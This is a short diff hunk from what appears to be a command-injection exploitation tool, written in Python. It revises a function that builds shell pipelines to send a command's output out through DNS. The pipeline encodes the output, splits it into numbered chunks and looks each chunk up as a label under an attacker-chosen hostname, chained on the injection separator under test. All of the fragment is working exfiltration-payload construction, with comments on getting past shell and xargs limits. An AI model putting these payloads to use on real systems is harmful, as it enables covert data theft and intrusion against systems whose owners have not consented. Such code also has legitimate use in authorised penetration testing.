@@ -351,9 +351,11 @@ def dns_exfil_command(hostname, cmd, separator=""):
   if separator not in (";", "\n"):
     # The name goes in through the environment and the chunk as an argument, because a BSD 'xargs'
     # will not build a replaced argument longer than 255 bytes - the lookup chain alone is more.
+    # The lookups chain on the separator under test like everything else: defaulting to '||' here
+    # asked the sink to pass an operator the detection never proved it would.
     return (encoded + PIPE + "fold -w" + chunk + PIPE + "cat -n" + PIPE + "tr -d ' '" + PIPE +
             "tr '\\t' '.'" + PIPE + "xargs -I{} env H=" + hostname + " sh -c '" +
-            dns_lookup_command("$0.$H") + "' {}")
+            dns_lookup_command("$0.$H", separator) + "' {}")
   # A separator that ends a statement can carry a loop instead, which knows how many chunks there
   # are and says so in every label - the reading end then knows when it has them all. A space after
   # the opening, or '$((' would be read as arithmetic instead of a subshell.
